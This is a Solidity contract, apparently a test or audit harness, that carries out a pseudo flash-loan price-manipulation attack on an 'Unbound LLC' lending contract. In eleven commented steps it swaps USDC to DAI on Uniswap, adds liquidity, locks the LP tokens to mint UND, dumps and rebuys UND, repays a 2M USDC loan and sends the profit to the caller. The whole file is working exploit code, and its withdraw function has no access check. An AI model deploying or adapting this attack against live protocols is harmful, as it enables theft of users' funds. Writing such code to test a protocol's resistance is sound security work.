pragma solidity ^0.7.5;


import "../Interfaces/IERC20.sol";
import "../test/uniswap/uniswapPeriph/interfaces/IUniswapV2Router02.sol";
import "../test/uniswap/interfaces/IUniswapV2Pair.sol";

interface UnboundLLC {
    function lockLPT (uint256 LPTamt, uint256 minTokenAmount) external;
    function unlockLPT (uint256 LPToken) external;
    function tokensLocked(address account) external view returns (uint256);
}
contract pseudoFlashloanAttack2 {
    IUniswapV2Router02 uniswapRouter;
    IUniswapV2Pair USDCDAIPair;
    IERC20_2 und;
    IERC20_2 usdc;
    IERC20_2 dai;
    // address[] daiUsdcPath; // Are these needed?
    // address[] undUsdcPath; // Are these needed?
    UnboundLLC unboundLLC;

    address router;
    address usdcAddr;
    address daiAddr;
    address undAddr;
    address LLCAddr;

    address owner;


     
    // _addresses[0] = _und, 
    // _addresses[1] = _usdc,
    // _addresses[2] = _dai, 
    // _addresses[3] = _uniswapRouter, 
    // _addresses[4] = _unboundLLC,
    // _addresses[5] = _usdcDaiPool
    constructor(address[6] memory _addresses) public {
        uniswapRouter = IUniswapV2Router02(_addresses[3]);
        USDCDAIPair = IUniswapV2Pair(_addresses[5]);
        und = IERC20_2(_addresses[0]);
        usdc = IERC20_2(_addresses[1]);
        dai = IERC20_2(_addresses[2]);
        // daiUsdcPath = [dai, usdc];
        // undUsdcPath = [und, usdc];
        unboundLLC = UnboundLLC(_addresses[4]);

        router = _addresses[3];
        usdcAddr = _addresses[1];
        daiAddr = _addresses[2];
        undAddr = _addresses[0];
        LLCAddr = _addresses[4];

        owner = msg.sender;
    }
    
    function withdraw(address _to) public {
        uint USDCBal = usdc.balanceOf(address(this));
        uint LPTokens = USDCDAIPair.balanceOf(address(this));
        usdc.transfer(_to, USDCBal);
        USDCDAIPair.transfer(_to, LPTokens);
    }    

    function flashLoanAttack(address loanReceiver) public {
        require(usdc.balanceOf(address(this)) >= 2010000 * (10 ** 6), "This Contract must contain 2M USDC");

        // Flashloan logic

        // step 1: attacker converts 500k USDC to DAI via UNISWAP
        usdc.approve(router, 1000000 * (10 ** 6));
        address[] memory _path = new address[](2);
        _path[0] = usdcAddr;
        _path[1] = daiAddr;
        uniswapRouter.swapExactTokensForTokens(
            1000000 * (10 ** 6),
            999999 * (10 ** 6),
            _path,
            address(this),  // receiver (this address)
            block.timestamp + 120  // 2 min wait time
        );

        // step 2: Add liquidity 1M USDC and 1M DAI
        usdc.approve(router, 1500000 * (10 ** 6));
        dai.approve(router, 500000 * (10 ** 18));
        uniswapRouter.addLiquidity(
            usdcAddr,
            daiAddr,
            1000000 * (10 ** 6),
            1000000 * (10 ** 18),
            1000000 * (10 ** 6),
            1000000 * (10 ** 18),
            address(this),
            block.timestamp + 120
        );

        // step 3: Attacker locks the LP tokens from step 2 and mints UND (minus fee)
        uint LPTokens = USDCDAIPair.balanceOf(address(this));
        USDCDAIPair.approve(LLCAddr, LPTokens);
        unboundLLC.lockLPT(LPTokens, 20000 * (10 ** 18));

        // step 4: Attacker sells all owned UND
        uint UndBalance = und.balanceOf(address(this));
        und.approve(router, UndBalance);
        address[] memory _path2 = new address[](2);
        _path2[0] = undAddr;
        _path2[1] = usdcAddr;
        uniswapRouter.swapExactTokensForTokens(
            UndBalance, // supposed to be 2.25M UND
            100000 * (10 ** 6), // minimum amt. Change this if something not working
            _path2,
            address(this),  // receiver (this address)
            block.timestamp + 120  // 2 min wait time
        );
        
        // step 5: Buy 10k USDC worth of UND and send to owner
        usdc.approve(router, 10000 * (10 ** 6));
        address[] memory _path3 = new address[](2);
        _path3[0] = usdcAddr;
        _path3[1] = undAddr;
        uniswapRouter.swapExactTokensForTokens(
            10000 * (10 ** 6),
            10000,
            _path3,
            msg.sender,   // Send the UND to original sender
            block.timestamp + 120
        );

        // step 6: Buy back remainder of UND
        uint usdcBal1 = usdc.balanceOf(address(this));
        usdc.approve(router, usdcBal1);
        uniswapRouter.swapExactTokensForTokens(
            usdcBal1,
            1000,
            _path3,
            address(this),
            block.timestamp + 120
        );

        // step 7: pay back UND loan
        uint256 owed = unboundLLC.tokensLocked(address(this));
        unboundLLC.unlockLPT(owed);

        // step 8: should have LP tokens back. Unlock them.
        uint finalLPBal = USDCDAIPair.balanceOf(address(this));
        USDCDAIPair.approve(router, finalLPBal);
        uniswapRouter.removeLiquidity(
            usdcAddr,
            daiAddr,
            finalLPBal,
            1000,
            1000,
            address(this),
            block.timestamp + 120
        );

        // step 9: convert Dai into USDC
        uint finalDaiBal = dai.balanceOf(address(this));
        dai.approve(router, finalDaiBal);
        address[] memory _path4 = new address[](2);
        _path4[0] = daiAddr;
        _path4[1] = usdcAddr;
        uniswapRouter.swapExactTokensForTokens(
            finalDaiBal,
            10000,
            _path4,
            address(this),
            block.timestamp + 120
        );

        // step 10: pay back 2mil USDC
        require(usdc.transfer(loanReceiver, 2000000 * (10 ** 6)), "Insufficient USDC? FlashLoan failed");

        // step 11: Send any profits to msg.sender
        uint USDCbal = usdc.balanceOf(address(this));
        usdc.transfer(msg.sender, USDCbal);
    }
}